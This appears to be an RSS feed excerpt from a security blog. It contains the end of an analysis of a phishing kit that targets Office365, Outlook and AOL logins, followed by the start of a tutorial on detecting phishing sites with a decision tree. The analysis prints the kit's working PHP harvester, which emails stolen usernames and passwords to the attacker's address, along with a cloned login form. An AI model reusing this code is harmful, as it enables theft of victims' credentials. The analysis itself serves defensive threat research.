&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;submit_btn&amp;#39;&lt;/span&gt;])){
    $admin_email &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;macdon161@gmail.com&amp;#34;&lt;/span&gt;;
    $email &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;email&amp;#39;&lt;/span&gt;];
    $password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_REQUEST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;];
      &lt;span style=&#34;color:#75715e&#34;&gt;// $headers = &amp;#34;From:&amp;#34;.$email;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
      &lt;span style=&#34;color:#75715e&#34;&gt;// Always set content-type when sending HTML email
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $headers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MIME-Version: 1.0&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $headers &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-type:text/html;charset=UTF-8&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;

    &lt;span style=&#34;color:#75715e&#34;&gt;// More headers
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    $headers &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;From:&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$email &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;


    $subject &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Recived data&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$email;

    $headers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;From: &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strip_tags&lt;/span&gt;($email) &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $headers &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Reply-To: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;strip_tags&lt;/span&gt;($email) &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $headers &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MIME-Version: 1.0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $headers &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type: text/html; charset=ISO-8859-1&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;

    $message &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;#39;&lt;/span&gt;;
    $message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;Username: &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$email&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;lt;br&amp;gt;&amp;#39;&lt;/span&gt;;
    $message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;Password: &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$password&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;p&amp;gt;&amp;lt;br&amp;gt;&amp;#39;&lt;/span&gt;;
    $message &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;#39;&lt;/span&gt;;
      &lt;span style=&#34;color:#75715e&#34;&gt;//send email
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;mail&lt;/span&gt;($admin_email, $subject, $message, $headers )){
      &lt;span style=&#34;color:#a6e22e&#34;&gt;header&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Location: https://login.microsoftonline.com/common/oauth2&amp;#39;&lt;/span&gt;);
    }

}
      &lt;span style=&#34;color:#75715e&#34;&gt;//if &amp;#34;email&amp;#34; variable is not filled out, display the form
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Considering that the exfiltration email is included also here, I assume that this is just the code of an old version of the kit that was left in the zip by mistake&amp;hellip; But who knows? 🤷&lt;/p&gt;
&lt;h3 id=&#34;aolphp&#34;&gt;aol.php&lt;/h3&gt;
&lt;p&gt;If we manually navigate to &lt;code&gt;aol.php&lt;/code&gt; with our browser, we see the following:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep1/aol.png&#34;
         alt=&#34;aol.php&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;aol.php&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;It seems another phishing page, this time for an app which has email capabilities.&lt;/p&gt;
&lt;p&gt;Interacting with the page, we can notice that &amp;lsquo;&lt;em&gt;Forgot Password?&lt;/em&gt;&amp;rsquo;, &amp;lsquo;&lt;em&gt;Get a Free Username&lt;/em&gt;&amp;rsquo; and &amp;lsquo;&lt;em&gt;Erase Hard Drive Junk Now&lt;/em&gt;&amp;rsquo; are not working, and the same applies to the &amp;lsquo;&lt;em&gt;GET THE AOL APP&lt;/em&gt;&amp;rsquo; button. In the source code, they all have the &lt;code&gt;href&lt;/code&gt; attribute equal to &lt;code&gt;javascript:void(0)&lt;/code&gt;.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep1/aolstore.png&#34;
         alt=&#34;AOL apps&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;AOL apps&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;Here is the form:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;require_once(&amp;#39;emailcode/email.php&amp;#39;)
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;
// SKIPPING NOT INTERESTING HTML
&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;needs-validation&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;post&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;novalidate&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form-group&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Email&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form-control&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;validationCustom01&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;placeholder&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Email&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;required&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;invalid-feedback&amp;#34;&lt;/span&gt;&amp;gt;
	    Enter Email Address
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form-group&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form-control&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;validationCustom02&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;placeholder&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Password&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;required&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;invalid-feedback&amp;#34;&lt;/span&gt;&amp;gt;
	    Enter Password
	&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;javascript:void(0);&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;forgotBtn&amp;#34;&lt;/span&gt;&amp;gt;Forgot Password?&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;button&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;btn stepBtn&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;submit&amp;#34;&lt;/span&gt;&amp;gt;Go to step 2&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;button&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;get-user&amp;#34;&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;span&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;javascript:void(0);&amp;#34;&lt;/span&gt;&amp;gt;Get a Free Username&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;span&lt;/span&gt;&amp;gt;
	&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;javascript:void(0);&amp;#34;&lt;/span&gt;&amp;gt;Erase Hard Drive Junk Now&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;
    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As for the other phishing pages of the kit, &lt;code&gt;emailcode/email.php&lt;/code&gt; is imported also here. However, in this case, the &lt;code&gt;action&lt;/code&gt; attribute of the form is empty; thus the php code will not be able to process the credentials of the victims.&lt;/p&gt;
&lt;p&gt;The file is clear according to VirusTotal:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep1/vtaol.png&#34;
         alt=&#34;aol.php on VirusTotal&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;aol.php on VirusTotal&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h2 id=&#34;what-about-the-other-files&#34;&gt;What about the other files?&lt;/h2&gt;
&lt;p&gt;We can check the VirusTotal detections of all the files using the sha256 hash:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ find . -type f | xargs sha256sum
e7ed36ceee5450b4243bbc35188afabdfb4280c7c57597001de0ed167299b01b  ./js/bootstrap.min.js
2777abe0312e6b49428d5d7f7f42e43af620793f86f823f2e045968afbdddb63  ./images/microbg.jpg
2ebc65a696544b8d69ade5f136250a9548d4badf1b9ad459e63ff68e7a985c69  ./images/mail.png
17f02fdb590800c9a21e2b6166f5f22cc54952d58897f09d8e82bb9195bc2071  ./images/outlook.png
089aa7fa65a4038b4ab9130d083e6bcc24b0e33f5018984ef1463b8516bc7993  ./images/microsoftlogo.png
e298d32d99708f56d68ef9cd0c44ec85910a4df7552b5b2041fcaa48d5ee9742  ./images/webmaillogo.png
efaccc2b190fcce0f0ab41064d882fb4a701c6aed6b1035595a16138e32a0a50  ./images/officelogo.png
6adc34b6d4d872e313e0857063eac568a489ab092ff0f15834a2559043c9c1e2  ./images/mobile-img.png
c86c4a6731077f1994a8caeccb1fc06477ea35a5b6abbb4abde1d06b8ef9ff32  ./images/landing-devices-bg.jpg
4603ea1b2f9df0c9d4f2a253c550ffbaf27ea2cb53ecde4277b2acf9dde33979  ./images/Onedrive-logo.png
1500514adf9e666a3d20530815df881bc94812c6906a53bd4c216d051d18c372  ./images/office.png
7a2c0b0e1e16041b12dd1a7d18438ceb14063c980799baee1d55cb2f04892777  ./images/officebg.jpg
84f1d1ffdc036768ffeba1be92362dcf619e7ce6ec27500ab47844ed24fc4230  ./index.php
0b09beb179bd176c93c443175940777332cf57ac9e4487ea9088ae21e3c6d032  ./microsoft.php
8979f584623e4307a42bd008d755c35456af8cb96bec89dd4fbec47036e20184  ./css/style.css
2c0f3dcfe93d7e380c290fe4ab838ed8cadff1596d62697f5444be460d1f876d  ./css/bootstrap.min.css
c60bd69cdc08032d32898d4d3f7648a5370f15720b58b51af77a4ecd72799bc3  ./webmail.php
e5a35da055cf9b0cf6d4cfbd2d0e8be75ebdc56949740c5e767f12915e6174eb  ./office.php
085f5dfb1f89bd983c58e618a95bf7bdaa872bee4a126495ec3e7cf421bb9fc2  ./aol.php
3234d6c03d185864d6537178a4d1e44c5277c9115f11b07f9c5be0517ebc51a7  ./emailcode/email.php
d6083dcb3385f93916f63b6e50d28791a51842d38bd507bcad7b731b7b33009d  ./outlookcode/email.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here are the detections of &lt;code&gt;index.php&lt;/code&gt;, &lt;code&gt;microsoft.php&lt;/code&gt;, &lt;code&gt;office.php&lt;/code&gt; and &lt;code&gt;webmail.php&lt;/code&gt; on VirusTotal as of today.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep1/vtall.png&#34;
         alt=&#34;index.php, microsoft.php, office.php and webmail.php on VirusTotal&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;index.php, microsoft.php, office.php and webmail.php on VirusTotal&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;No matches were found for &lt;code&gt;emailcode/email.php&lt;/code&gt; and &lt;code&gt;outlookcode/email.php&lt;/code&gt;. All the other files were flagged as &amp;lsquo;&lt;em&gt;Undetected&lt;/em&gt;&amp;rsquo; by all the engines on VirusTotal.&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;In this post, we analyzed &lt;code&gt;u.zip&lt;/code&gt;, a phishing kit found online which tricks victims into giving their credentials using 3 templates: one for Office365, one for Outlook and one for other email services (with a cPanel theme).&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep1/diagram.png&#34;
         alt=&#34;Schema of the phishing kit&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Schema of the phishing kit&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;The templates redirect the credentials to &lt;code&gt;emailcode/email.php&lt;/code&gt;, which tries to gather additional information and writes them into an email, that is sent to the exfiltration email address. At the end of the execution, the victim is redirected to &lt;code&gt;login.microsoftonline.com&lt;/code&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Machine Learning and phishing, pt.1: decision tree</title>
      <link>/posts/ml-with-phishing-ep1/</link>
      <pubDate>Sat, 09 May 2020 00:00:00 +0000</pubDate>
      
      <guid>/posts/ml-with-phishing-ep1/</guid>
      <description>&lt;figure&gt;&lt;img src=&#34;/images/posts/ml-with-phishing/jaws.jpg&#34;/&gt;
&lt;/figure&gt;

&lt;p&gt;Last week I started hunting and reporting phishing websites on Twitter (follow me &lt;a href=&#34;https://twitter.com/andpalmier&#34;&gt;here&lt;/a&gt; if you are interested). After some digging, I have decided that it would be interesting to use this topic to refresh my memory around the basics of Machine Learning.&lt;/p&gt;
&lt;p&gt;In this series of posts I am going to use a smaller variant of &lt;a href=&#34;https://data.mendeley.com/datasets/h3cgnj8hft/1/&#34;&gt;this dataset&lt;/a&gt; to create machine learning models which (hopefully) will be able to identify a phishing website.&lt;/p&gt;
&lt;p&gt;Please, note that the dataset contains the 10 &amp;lsquo;&lt;em&gt;baseline features&lt;/em&gt;&amp;rsquo; that were selected in &lt;a href=&#34;https://www.sciencedirect.com/science/article/pii/S0020025519300763&#34;&gt;this study&lt;/a&gt;.
The list of features and the code of this post in form of Jupyter notebook can be found in this &lt;a href=&#34;https://github.com/andpalmier/MLWithPhishing&#34;&gt;repository on GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;This post has been inspired by:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://medium.com/@mohtedibf/indepth-parameter-tuning-for-decision-tree-6753118a03c3&#34;&gt;InDepth: Parameter tuning for Decision Tree&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://medium.com/@NicolasPapernot/detecting-phishing-websites-using-a-decision-tree-ed069d073723&#34;&gt;Detecting phishing websites using a decision tree&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;a-simple-but-effective-decision-tree&#34;&gt;A simple but effective decision tree&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s start with importing the libraries and the data. I used a csv version of the dataset, which you can find &lt;a href=&#34;https://github.com/andpalmier/MLWithPhishing&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; numpy &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; np
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; sklearn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; tree

&lt;span style=&#34;color:#75715e&#34;&gt;# Load the training data from a CSV file&lt;/span&gt;
training_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;genfromtxt(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;phishing_smaller.csv&amp;#39;&lt;/span&gt;, delimiter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;, dtype&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;int32)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The csv has 10.000 samples with 11 columns, where the last one is the label of the sample, while the other values are the features.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# inputs are in all columns except the last one&lt;/span&gt;
inputs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; training_data[:,:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]

&lt;span style=&#34;color:#75715e&#34;&gt;# outputs in the last column&lt;/span&gt;
outputs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; training_data[:, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We will use &lt;code&gt;StratifiedKFold&lt;/code&gt; to keep the frequency of the classes constant during our K-fold cross-validation. The &lt;code&gt;random_state&lt;/code&gt; parameter is used for k-fold and the classifier to reproduce the same setup for all the iterations of the model.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; sklearn.model_selection &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; StratifiedKFold

&lt;span style=&#34;color:#75715e&#34;&gt;# use 10-fold&lt;/span&gt;
